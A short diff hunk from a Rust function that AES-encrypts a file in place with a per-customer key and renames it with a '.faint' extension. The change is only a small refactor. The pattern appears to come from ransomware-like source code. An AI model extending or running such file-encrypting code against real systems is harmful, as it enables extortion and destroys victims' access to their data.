@@ -52,7 +52,7 @@ pub fn encrypt(file: &path::PathBuf, customer: &Customer) {
             let cipher =
                 libaes::Cipher::new_256(customer.keypair.key.as_bytes().try_into().unwrap());
             let encrypted = cipher.cbc_encrypt(customer.keypair.iv.as_bytes(), &file_content);
-            if let Ok(_) = fs::write(file, encrypted) {
+            if fs::write(file, encrypted).is_ok() {
                 fs::rename(file, format!("{}.faint", file.display())).unwrap();
             }
         }
